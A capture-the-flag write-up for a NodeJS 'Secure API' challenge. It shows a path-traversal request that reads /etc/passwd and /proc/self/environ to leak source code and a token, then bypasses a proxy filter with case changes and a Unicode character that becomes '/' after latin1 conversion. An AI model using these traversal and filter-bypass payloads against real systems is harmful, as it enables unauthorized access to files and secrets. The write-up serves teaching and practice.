# API
We are given URL of some service that allegedly provides `Secure API`.
The site was plain, nothing was interactive, there were no links that could point us to any endpoint worth exploring.

After a lot of poking, changing random things in burp we found a way to trigger LFI with `GET file:///../../../../etc/passwd`. This gave us possibility to leak every piece of the source code.

Application turned out to be simple HTTP server written in NodeJS. There were two interesting functions:

```js
getProxy: function(request, response) {
   this.getRequestFields(request, global.config, function(fields) {

       if(!fields || !fields.url) {
           response.end('Invalid fields.');
       }


       if(fields.url.indexOf('get_secret') !== -1 || fields.url.indexOf('/') !== -1) {
           response.end("Invalid request");
           return;
       }
       
       fields.url = Buffer.from(fields.url.toLowerCase(), "latin1").toString();

       var options = {
         host: global.config.PROXY,
         port: 2222,
         path: fields.url
       };

       http.get(options, function(rresponse) {
         var body = '';
         rresponse.on('data', function(chunk) {
           body += chunk;
         });
         rresponse.on('end', function() {
           response.end(body);
         });
       }).on('error', function(e) {
           response.end("Got error: " + e.message);
       }); 
   });
},
getConfigFromVault: function(req, res) {
    var options = {
      host: global.config.PROXY,
      port: 2222,
      path: '/get_secret/' + global.secretkey
    };

    http.get(options, function(response) {
      var body = '';
      response.on('data', function(chunk) {
        body += chunk;
      });
      response.on('end', function() {
        res.end(body);
      });
    }).on('error', function(e) {
        res.end("Got error: " + e.message);
    }); 
}
```


Available under following routes:

```js
if(urlParts[0]) {
    switch(urlParts[0]) {
        case 'getconfig':
            functions.getConfigFromVault(request, response);
        break;
        case 'proxy':
            functions.getProxy(request, response);
        break;
        default:
            new doRequest(request, response);
            break;
    }
} else {
    new doRequest(request, response);
}

```

After triggering `getConfigFromVault` we got a JSON message about incorrect token with flag set to null.

This is the endpoint we need to hit but with correct token (correct token can be found inside env vars and leaked with LFI of /proc/self/environ). This would be easy to do if we could provide the `getConfigFromVault` endpoint our own token, which is not the case.

Another way to make this request to the proxy is through the `getProxy` function. We would like to send request like `GET /proxy?url=/get_secret/f0af17449a83681de22db7ce16672f16f37131bec0022371d4ace5d1854301e0`. Which should give us the flag.

Application defends itself from that with `if(fields.url.indexOf('get_secret') !== -1 || fields.url.indexOf('/') !== -1) {`.
But fortunately both of the checks can be bypassed. For the first one we just change `get_secret` to `get_sEcret`. Second one is a bit harder, we need to send something that is not a `/` but will become one after `fields.url = Buffer.from(fields.url.toLowerCase(), "latin1").toString();`.

It turns out that for example 琯 is converted to `/` by the line above, this results in a final payload: `https://api.dctfq19.def.camp:1234/proxy?url=琯get_sEcret琯f0af17449a83681de22db7ce16672f16f37131bec0022371d4ace5d1854301e0`.
